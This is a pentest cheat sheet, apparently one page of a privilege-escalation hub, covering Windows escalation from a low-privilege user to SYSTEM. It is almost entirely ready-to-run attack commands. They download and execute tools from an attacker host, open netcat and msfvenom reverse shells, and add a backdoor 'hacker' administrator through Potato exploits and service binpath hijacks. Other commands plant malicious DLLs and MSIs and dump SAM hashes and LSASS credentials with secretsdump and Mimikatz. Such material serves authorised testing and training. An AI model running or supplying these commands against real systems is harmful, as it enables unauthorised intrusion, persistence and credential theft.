# 🪟 Windows Privilege Escalation

> **From low-priv user to SYSTEM on Windows.** Covers both manual techniques and automated tools.

---

## Table of Contents
- [Automated Tools](#automated-tools)
- [System Information & Patch Level](#system-information--patch-level)
- [User & Token Privileges](#user--token-privileges)
- [Token Impersonation & Potato Attacks](#token-impersonation--potato-attacks)
- [Service Misconfigurations](#service-misconfigurations)
- [Registry-Based Escalation](#registry-based-escalation)
- [Stored Credentials](#stored-credentials)
- [DLL Hijacking](#dll-hijacking)
- [Scheduled Tasks](#scheduled-tasks)
- [Always Install Elevated](#always-install-elevated)
- [Kernel/OS Exploits](#kernelos-exploits)
- [SAM Database Dump](#sam-database-dump)

---

## Automated Tools

- [ ] **WinPEAS** (most comprehensive):
  ```cmd
  winPEAS.exe quiet
  winPEAS.bat
  ```
  ```powershell
  # Download and run
  IWR http://<attacker>:8000/winPEAS.exe -OutFile C:\Temp\winpeas.exe
  .\winpeas.exe
  ```
- [ ] **PowerUp** (service/registry misconfigurations):
  ```powershell
  Import-Module .\PowerUp.ps1
  Invoke-AllChecks
  ```
- [ ] **JAWS** (Just Another Windows Script):
  ```powershell
  IEX(New-Object Net.WebClient).downloadString('http://<attacker>/jaws-enum.ps1')
  ```
- [ ] **Seatbelt** (security-focused enumeration):
  ```cmd
  Seatbelt.exe -group=all
  ```

---

## System Information & Patch Level

- [ ] **System info**:
  ```cmd
  systeminfo
  ```
- [ ] **Patch level** (missing hotfixes):
  ```cmd
  wmic qfe list brief /format:table
  wmic qfe get HotFixID
  ```
- [ ] **OS and version**:
  ```cmd
  wmic os get Caption, Version, BuildNumber, OSArchitecture
  ```
- [ ] **Search for kernel exploits**:
  ```bash
  searchsploit Windows <OS_version>
  # Or use Watson / WES-NG (Windows Exploit Suggester)
  python3 wes.py systeminfo.txt
  ```

---

## User & Token Privileges

- [ ] **Current user privileges**:
  ```cmd
  whoami /all
  whoami /priv
  whoami /groups
  ```
- [ ] **Key exploitable privileges**:

| Privilege | Attack | Tool |
|---|---|---|
| `SeImpersonatePrivilege` | Token impersonation | PrintSpoofer, GodPotato, RoguePotato |
| `SeAssignPrimaryTokenPrivilege` | Token impersonation | Same as above |
| `SeDebugPrivilege` | Dump LSASS, inject into processes | Mimikatz |
| `SeTakeOwnershipPrivilege` | Take ownership of any file | `takeown` |
| `SeBackupPrivilege` | Read any file (backup) | reg save SAM |
| `SeRestorePrivilege` | Write any file | Overwrite system files |
| `SeLoadDriverPrivilege` | Load malicious driver | Capcom exploit |

---

## Token Impersonation & Potato Attacks

If `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` is enabled:

> **💡 These work on IIS, MSSQL, service accounts, and any account with these privileges.**

- [ ] **PrintSpoofer** (Windows 10 / Server 2019):
  ```cmd
  PrintSpoofer.exe -i -c cmd
  PrintSpoofer.exe -c "cmd /c whoami"
  PrintSpoofer.exe -c "cmd /c nc.exe <attacker> 4444 -e cmd"
  ```
- [ ] **GodPotato** (Windows Server 2012 – 2022, Win10-11):
  ```cmd
  GodPotato.exe -cmd "cmd /c whoami"
  GodPotato.exe -cmd "cmd /c net user hacker Password123 /add && net localgroup administrators hacker /add"
  ```
- [ ] **RoguePotato** (Windows Server 2016/2019):
  ```cmd
  RoguePotato.exe -r <attacker_ip> -e "cmd.exe /c whoami > C:\output.txt" -l 9999
  ```
- [ ] **JuicyPotato** (older — Windows Server 2008, 2016):
  ```cmd
  JuicyPotato.exe -l 1337 -p C:\Windows\system32\cmd.exe -a "/c whoami" -t *
  # Requires a valid CLSID for the OS version
  ```
- [ ] **SweetPotato** (combined):
  ```cmd
  SweetPotato.exe -a "whoami"
  ```

> **💡 Tip:** GodPotato works on the widest range of modern Windows versions. Start there.

---

## Service Misconfigurations

- [ ] **Unquoted service paths** (service path with space, no quotes):
  ```cmd
  wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\" | findstr /i /v """
  
  sc qc <service_name>    # Check specific service path
  ```
  **Exploit:** If path is `C:\Program Files\My App\service.exe` without quotes:
  - Place `C:\Program.exe` → system runs it as SYSTEM
  - Or `C:\Program Files\My.exe`
  
- [ ] **Weak service permissions** (can modify a service):
  ```cmd
  # PowerUp
  Invoke-AllChecks | grep -i service
  
  # Accesschk (Sysinternals)
  accesschk.exe -uwcqv "Authenticated Users" *
  accesschk.exe -uwcqv "Users" *
  ```
  **Exploit if you can modify service binary path:**
  ```cmd
  sc config <service> binpath= "cmd /c net user hacker P@ss123 /add"
  sc stop <service>
  sc start <service>
  sc config <service> binpath= "cmd /c net localgroup administrators hacker /add"
  sc stop <service>
  sc start <service>
  ```
- [ ] **Writable service binary** (replace the actual EXE):
  ```cmd
  # Check if you can write to the service binary
  icacls "C:\path\to\service.exe"
  # If "BUILTIN\Users:(M)" or similar write access:
  copy C:\Temp\malicious.exe "C:\path\to\service.exe"
  sc stop <service> && sc start <service>
  ```

---

## Registry-Based Escalation

- [ ] **AlwaysInstallElevated** (MSI runs as SYSTEM):
  ```cmd
  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  ```
  **If both are 1:**
  ```bash
  # Attacker — generate MSI payload
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker> LPORT=4444 -f msi -o shell.msi
  
  # Target — install it (runs as SYSTEM)
  msiexec /quiet /qn /i C:\Temp\shell.msi
  ```
- [ ] **Autorun registry keys** (persist as privileged user):
  ```cmd
  reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
  reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
  ```

---

## Stored Credentials

- [ ] **Windows Credential Manager**:
  ```cmd
  cmdkey /list
  # If saved creds exist, use runas:
  runas /savecred /user:<domain>\<user> cmd
  ```
- [ ] **Unattend files** (plaintext/base64 passwords):
  ```cmd
  dir /s /b C:\*sysprep.inf C:\*sysprep.xml C:\*unattended.xml C:\*unattend.xml C:\*unattend.ini 2>nul
  ```
- [ ] **GPP Passwords** (Group Policy Preferences — SYSVOL):
  ```bash
  # From Linux
  crackmapexec smb $IP -u <user> -p <pass> -M gpp_password
  
  # From Windows (PowerSploit)
  Get-GPPPassword
  ```
- [ ] **SAM / SYSTEM hive** (local user hashes):
  ```cmd
  # Requires admin/SYSTEM but not necessarily built-in Administrator
  reg save HKLM\SAM C:\Temp\sam
  reg save HKLM\SYSTEM C:\Temp\system
  # Transfer and dump with impacket
  ```

---

## DLL Hijacking

When a service loads DLLs and one can be planted in a writable directory:

- [ ] **Identify missing DLLs** (use Process Monitor as admin, or check with PowerUp):
  ```powershell
  Find-PathDLLHijack
  ```
- [ ] **Create malicious DLL** (msfvenom):
  ```bash
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker> LPORT=4444 -f dll -o malicious.dll
  ```
- [ ] **Plant the DLL** in writable path that's searched before legitimate location

---

## Scheduled Tasks

- [ ] **List scheduled tasks**:
  ```cmd
  schtasks /query /fo LIST /v
  Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "SYSTEM"}
  ```
- [ ] **Check permissions on task binary**:
  ```cmd
  icacls <path_to_task_binary>
  ```
- [ ] **If writable**, replace with malicious binary and wait for task to run

---

## Always Install Elevated

(Covered above in Registry section)

---

## Kernel/OS Exploits

- [ ] **Key Windows CVEs**:

| CVE | Name | Affected | Notes |
|---|---|---|---|
| MS17-010 | EternalBlue | Win 7/2008 | SMB RCE → SYSTEM |
| CVE-2019-0708 | BlueKeep | Win 7/2008 | RDP RCE → SYSTEM |
| CVE-2021-1675 | PrintNightmare | Most | Print Spooler |
| CVE-2021-34527 | PrintNightmare RCE | Most | Remote DLL |
| MS16-032 | Secondary Logon | Win 7-10 | PrivEsc |
| MS15-051 | Windows Kernel | Win 7/2008 | PrivEsc |

- [ ] **Watson** (C# — lists missing patches):
  ```cmd
  .\Watson.exe
  ```
- [ ] **Windows Exploit Suggester (WES-NG)**:
  ```bash
  # Attacker
  python3 wes.py systeminfo.txt
  ```

---

## SAM Database Dump

With admin/SYSTEM access, dump all local hashes:

- [ ] **Via registry (offline)**:
  ```cmd
  reg save HKLM\SAM sam.hive
  reg save HKLM\SYSTEM system.hive
  reg save HKLM\SECURITY security.hive
  ```
  ```bash
  # Attacker — dump hashes
  python3 secretsdump.py -sam sam.hive -system system.hive -security security.hive LOCAL
  ```
- [ ] **Via Volume Shadow Copy**:
  ```cmd
  vssadmin create shadow /for=C:
  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\sam
  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\system
  ```
- [ ] **Mimikatz** (if AV allows):
  ```cmd
  privilege::debug
  lsadump::sam
  sekurlsa::logonpasswords
  ```
- [ ] **CrackMapExec SAM dump**:
  ```bash
  crackmapexec smb $IP -u <admin> -p <pass> --sam
  ```

---

## 🔗 References

- [LOLBAS](https://lolbas-project.github.io) — Living off the land binaries
- [HackTricks — Windows PrivEsc](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [PrintSpoofer GitHub](https://github.com/itm4n/PrintSpoofer)
- [GodPotato GitHub](https://github.com/BeichenDream/GodPotato)
- [PayloadsAllTheThings — Windows PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

---

*[← Linux PrivEsc](./01_linux_privesc.md) · [PrivEsc Hub](./README.md) · [Database PrivEsc →](./03_database_privesc.md)*
